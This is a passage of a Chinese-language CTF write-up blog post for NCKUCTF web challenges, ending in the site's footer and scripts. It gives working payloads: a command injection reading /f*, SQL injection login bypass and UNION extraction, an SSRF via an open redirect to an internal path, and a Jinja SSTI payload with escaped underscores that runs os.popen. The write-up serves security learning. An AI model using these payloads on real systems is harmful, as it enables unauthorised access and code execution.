+</div><p>那綜合以上黑名單，可以拼出 <code>payload='`cat${IFS}/f*`'</code><br>
+<img src="https://hackmd.io/_uploads/rJcL18v_ll.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{d19_70015_15_m491c!}</code></p></blockquote>
+<h3 id="login">login
+</h3><p>進來後打開Magic會有這個<br>
+<img src="https://hackmd.io/_uploads/BkurzmOOxl.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+那就看這個湊出payload<br>
+<img src="https://hackmd.io/_uploads/rkHcf7_dgx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+前面有<code>'</code>和<code>)</code>要閉合，所以payload是<code>admin') OR 1=1 --#</code><br>
+然後密碼隨便打<br>
+<img src="https://hackmd.io/_uploads/Syc7mQddeg.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{SQL1nj3c710n_1s_S0_l33t}</code></p></blockquote>
+<h3 id="sqli-unoin">sqli unoin
+</h3><p>都說是UNION了一開始進去就先用UNION看欄位數，測出來有三欄<br>
+<img src="https://hackmd.io/_uploads/SJW8XNOOgg.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+下面有提示<code>table:flags column:flag_value</code><br>
+所以payload是<code>https://chall.nckuctf.org:28303/?id=-1 UNION SELECT 1,flag_value,3 FROM flags--</code><br>
+<img src="https://hackmd.io/_uploads/r1HbVEu_lx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{UNION_SELECT_FOO_FROM_BAR}</code></p></blockquote>
+<h3 id="ssrf2">ssrf2
+</h3><p>進去後看到source code要用httpbin.dev去碰內網的/internal-only<br>
+<img src="https://hackmd.io/_uploads/HyGoTNd_ll.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+所以payload是<code>https://httpbin.dev/redirect-to?url=http://0/internal-only</code><br>
+<img src="https://hackmd.io/_uploads/HyNTT4dOge.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}</code></p></blockquote>
+<h3 id="ssti-waf1">SSTI-waf1
+</h3><p>進去後看到source code有擋<code>_</code><br>
+<img src="https://hackmd.io/_uploads/HynXj7Odxx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+那就找一個沒_的payload<br>
+payload:<code>{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}</code><br>
+<img src="https://hackmd.io/_uploads/BkUPi7_Olg.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+最後<code>cat /flag</code><br>
+<img src="https://hackmd.io/_uploads/S1m9jXuulx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{SSTI_can_use_without__}</code></p></blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/2025/">2025</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相關文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Junior 前端ㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/2025-ais3-pre-exam-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://hackmd.io/_uploads/HkXttAUMge.png" loading="lazy" data-key="" data-hash="https://hackmd.io/_uploads/HkXttAUMge.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Pre-exam Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/2024-ais3-junior-llm%E3%84%89writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/2024-ais3-junior-llm%E3%84%89writeup/image.225b4d9249aa4fcd9b309107e83a78b3_hu_c65ab6a7c527d882.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2024 AIS3 Junior LLMㄉWriteup"
+                        
+                        data-hash="md5-IltNkkmqT82bMJEH6Dp4sw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024 AIS3 Junior LLMㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/2024-ais3-junior-web%E3%84%89writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024 AIS3 Junior WebㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/">
+        
+        
+            <div class="article-image">
+                <img src="/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.dbde94113b17ab422760313a64186c77_hu_774337f90fe6e08.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025 AIS3 Junior 心得"
+                        
+                        data-hash="md5-296UETsXq0InYDE6ZBhsdw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Junior 心得</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Chun-Hao Chung
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 建立 <br />
+        主題 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 設計
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
